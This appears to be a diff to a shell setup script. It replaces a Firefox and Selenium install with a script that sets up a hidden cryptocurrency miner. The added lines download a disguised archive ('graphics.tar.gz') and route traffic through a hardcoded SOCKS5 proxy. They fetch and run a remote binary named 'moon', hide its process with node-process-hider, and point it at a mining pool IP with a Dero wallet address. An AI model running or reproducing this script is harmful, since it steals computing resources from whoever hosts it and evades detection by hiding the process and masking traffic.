@@ -1,14 +1,41 @@
-apt-get update
-apt-get install wget curl screen -y
-wget 'https://download.mozilla.org/?product=firefox-latest&os=linux64&lang=en-US' -O firefox.tar.bz2
-tar -xjf firefox.tar.bz2
-mv firefox /opt/
-ln -s /opt/firefox/firefox /usr/local/bin/firefox
-wget 'https://github.com/mozilla/geckodriver/releases/download/v0.33.0/geckodriver-v0.33.0-linux64.tar.gz'
-tar -xzf geckodriver*.tar.gz
-chmod +x geckodriver
-mv geckodriver /usr/local/bin/
-apt-get install libxtst6 libdbus-glib-1-2 -y
-pip install selenium webdriver_manager
-python3 main.py
-sleep 3435436346
+apt update && apt -y install sudo wget curl unzip
+
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 =  68.71.249.153:48606 
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ipinfo.io
+
+echo " "
+
+echo " "
+
+./graftcp/graftcp wget https://gitgud.io/trendava/ruby/-/raw/master/moon
+
+chmod +x moon
+
+ph add moon
+
+./graftcp/graftcp ./moon -d 45.86.230.214:80 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.$(echo $(shuf -i 1-9999 -n 1)-SPACE)
